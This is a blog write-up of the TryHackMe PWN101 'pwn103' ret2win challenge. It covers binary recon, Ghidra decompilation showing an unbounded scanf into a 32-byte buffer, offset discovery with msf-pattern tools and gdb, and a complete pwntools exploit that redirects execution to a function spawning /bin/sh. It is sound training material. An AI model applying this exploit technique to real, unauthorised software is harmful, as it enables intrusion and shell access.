---
layout: post
author: pr0rat
title: "TryHackMe - ret2win"
date: 2023-05-27 15:10 +0300
image: /assets/img/Posts/ret-to-win.jpg
categories: [Tryhackme, pwn101, Medium]
tags: [pwn, overflow, binary, ghidra, pwntools, checksec, msf_modules]
---

| Room       | [PWN101](https://tryhackme.com/room/pwn101)              |
| ---------- | ---------------------------------------------------------- |
| Author     | [tryhackme](https://tryhackme.com/p/tryhackme)             |
| Difficulty | Medium                                                     |

> In this post i will be going to explain challenge 3 of pwn101 room in tryhackme as part of the binary exploitation series.

## Let's begin
first download the binary provided by tryhackme. Unlike the previous write where we were provided with the source for the binary, in this challenge we are given on the binary, which call for reverse engineering knowledge. well, as a beginner i will be using `ghidra`. incase you dont have it installed you can run the command `sudo apt install ghidra` and it will be set for you.

Well, it is always good to first do some simple recon on the binary inorder to have a clue about the monster you are dealing with. First i do a file on our binary and i find that it is for a 64 bit architecture, `dynamically linked` and it is `not stripped`, which means we will be able to see the functions when we throw it in ghidra..mmmmmh sweet.  

```bash
┌──(kali㉿prosec)-[~/hacks/pwn/pwn101/pwn103]
└─$ file pwn103.pwn103 
pwn103.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
```
Checking the security of the file, we have `None executable(NX) enabled` which means we cant execute shell code in the stack, okay. `No PIE` and `No canary found`? this kicks something, there might be a potential buffer overflow and the positive we can take from `No PIE` is that memory address of our function we will jump to will not be changing everytime we execute the program. 
```bash
┌──(kali㉿prosec)-[~/hacks/pwn/pwn101/pwn103]
└─$ checksec --file pwn103.pwn103
[*] '/home/kali/hacks/pwn/pwn101/pwn103/pwn103.pwn103'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Now i can go on and start playing with the file. 
```bash
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try harder!!! 💪
zsh: segmentation fault  ./pwn103.pwn103
```
In the course of engaging with it, i found something interesting. At option 3 of the menu, asks us whether we've found the vulnerability in this program and on throwing a bunch of A's we get a `segmentation fault`. This is something, isn't.

## Reversing
Going further and reversing the binary, we see there are several functions which are called by our main function. focusing on our `3` option, we see that `general()` function is called.

```c
void main(void)

{
  undefined4 local_c;
  
  setup();
  banner();
  puts(&DAT_00403298); 
  puts(&DAT_004032c0);
  puts(&DAT_00403298);
  printf(&DAT_00403323);
  __isoc99_scanf(&DAT_00403340,&local_c);
  switch(local_c) {
  default:
    main();
    break;
  case 1:
    announcements();
    break;
  case 2:
    rules();
    break;
  case 3:
    general();
    break;
  case 4:
    discussion();
    break;
  case 5:
    bot_cmd();
```
Going to  function we find that our input of unspecified size is taken to `local_28` variable that will store only `32` bytes of them and the rest occupy some memory in the stack overwriting the return address with `AAAA` whereby since it is not a valid memory address, the program breaks. 
```c
void general(void)

{
  int iVar1;
  char local_28 [32];
  
  puts(&DAT_004023aa);
  puts(&DAT_004023c0);
  puts(&DAT_004023e8);
  puts(&DAT_00402418);
  printf("------[pwner]: ");
  __isoc99_scanf(&DAT_0040245c,local_28);
  iVar1 = strcmp(local_28,"yes");
  if (iVar1 == 0) {
    puts(&DAT_00402463);
    main();
  }
  else {
    puts(&DAT_0040247f); 
  }
  return;
}
```

One of the functions caught my eye, `admins_only` which was executing /bin/sh. This is our target, if we get a chance to overwrite the return address of this function we get a shell and possibly read the flag. cool, now let's find the offset.
```bash
void admins_only(void)

{
  puts(&DAT_00403267);
  puts(&DAT_0040327c);
  system("/bin/sh");
  return;
}
```
`gdb` and `msf-pattern_create` will do this for us.

```bash
┌──(kali㉿prosec)-[~/hacks/pwn/pwn101/pwn103]
└─$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
```bash
(gdb) r
Starting program: /home/kali/hacks/pwn/pwn101/pwn103/pwn103.pwn103                                                                                                     
[Thread debugging using libthread_db enabled]                                                                                                                          
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                                                                             
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿                                                                                                                                               
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                                                                                                                                               
                                                                                                                                                                       
  [THM Discord Server]                                                                                                                                                 
                                                                                                                                                                       
➖➖➖➖➖➖➖➖➖➖➖                                                                                                                                                 
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Try harder!!! 💪

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401377 in general ()
(gdb) x/1s $rsp
0x7fffffffddb8: "b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
(gdb) 
```
```bash
┌──(kali㉿prosec)-[~]
└─$ msf-pattern_offset -l 100 -q b3Ab
[*] Exact match at offset 40
```
Well, we get the offset is at 40 bytes. GOOD!!!!!!, now lets find the address of our `admins_only` function. we find that it is at `0x401554` address.

```bash
(gdb) p *admins_only
$1 = {<text variable, no debug info>} 0x401554 <admins_only>                                                                                                  
(gdb)   
```
## Exploit development
Since we now have all the information we need to crack this challenge, lets create a python scripts to all the steps for us

```python
#!/usr/bin/env python3
#author: pr0rat

from pwn import *

exe = './pwn103.pwn103'
def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.LOCAL:
		return process([exe] + argv, *a, **kw)
	else:
		print("Usage: ./exploit.py REMOTE <server> <port>")
		print(" OR ./exploit.py LOCAL")
		exit()

ret_main = p64(0x0000000000401677) #return adress for main, i guess any should work
padding = b'A'*40 + ret_main + p64(0x401554)
p= start()
#remember our buffer overflow is in option 3 of the menu
p.sendline(b'3')
p.recv()
p.sendline(padding)
p.interactive()
```
## Exploitation
With the above script we go further and run it to get a shell on our machine on the remote host or the server hosting the challenge.
> Either locally or remotely by supplying arguments based on where you want to execute it.

```bash
┌──(kali㉿prosec)-[~/hacks/pwn/pwn101/pwn103]
└─$ python3 exploit.py      
Usage: ./exploit.py REMOTE <server> <port>
 OR ./exploit.py LOCAL
```
```bash                                                         
┌──(kali㉿prosec)-[~/hacks/pwn/pwn101/pwn103]
└─$ python3 exploit.py LOCAL
[+] Starting local process './pwn103.pwn103': pid 61213
[*] Switching to interactive mode
Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ ls
core  exploit.py  pwn103.pwn103
$  
```
Hooray!! that was the challenge. It was pretty and it provides a good way to start pwning.


